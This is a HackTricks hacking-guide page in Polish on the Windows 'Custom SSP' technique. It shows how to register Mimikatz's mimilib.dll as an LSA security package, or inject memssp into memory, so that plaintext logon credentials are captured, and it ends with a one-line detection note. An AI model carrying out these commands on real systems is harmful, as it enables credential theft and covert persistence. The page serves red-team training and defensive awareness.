# Custom SSP

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Custom SSP

[Dowiedz się, czym jest SSP (Security Support Provider) tutaj.](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
Możesz stworzyć **własny SSP**, aby **przechwycić** w **czystym tekście** **poświadczenia** używane do uzyskania dostępu do maszyny.

#### Mimilib

Możesz użyć binarnego pliku `mimilib.dll` dostarczonego przez Mimikatz. **To zapisze w pliku wszystkie poświadczenia w czystym tekście.**\
Umieść dll w `C:\Windows\System32\`\
Uzyskaj listę istniejących pakietów zabezpieczeń LSA: 

{% code title="attacker@target" %}
```bash
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
{% endcode %}

Dodaj `mimilib.dll` do listy dostawców wsparcia bezpieczeństwa (Pakiety zabezpieczeń):
```powershell
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
I po ponownym uruchomieniu wszystkie poświadczenia można znaleźć w postaci czystego tekstu w `C:\Windows\System32\kiwissp.log`

#### W pamięci

Możesz również wstrzyknąć to bezpośrednio do pamięci za pomocą Mimikatz (zauważ, że może to być trochę niestabilne/nie działać):
```powershell
privilege::debug
misc::memssp
```
To nie przetrwa ponownego uruchomienia.

#### Łagodzenie

Identyfikator zdarzenia 4657 - Audyt utworzenia/zmiany `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`

{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
{% endhint %}
